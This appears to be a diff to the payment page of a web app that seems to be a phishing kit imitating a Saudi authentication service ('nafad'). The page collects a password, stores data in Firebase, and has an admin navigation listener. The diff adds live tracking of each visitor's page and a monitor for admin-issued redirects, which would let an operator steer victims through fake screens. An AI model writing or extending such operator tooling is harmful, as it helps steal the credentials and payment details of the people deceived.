@@ -14,6 +14,8 @@ import { useEffect, useState } from "react";
 import { addData, db } from "@/lib/firebase";
 import { Alert } from "@/components/ui/alert";
 import { doc, onSnapshot, updateDoc } from "firebase/firestore";
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
+import { updateVisitorPage } from "@/lib/visitor-tracking";
 
 export default function Component() {
   const [showConfirmDialog, setShowConfirmDialog] = useState(false);
@@ -24,9 +26,20 @@ export default function Component() {
   const [password, setPassword] = useState("");
   const [showError, setShowError] = useState("");
 
+  const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
+  
+  // Monitor for admin redirects
+  useRedirectMonitor({ visitorId, currentPage: "payment" })
+  
+  // Update visitor page
+  useEffect(() => {
+    if (visitorId) {
+      updateVisitorPage(visitorId, "payment")
+    }
+  }, [visitorId])
+
   // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control
   useEffect(() => {
-    const visitorId = localStorage.getItem("visitor")
     if (!visitorId) return
 
     console.log("[nafad] Setting up navigation listener for visitor:", visitorId)
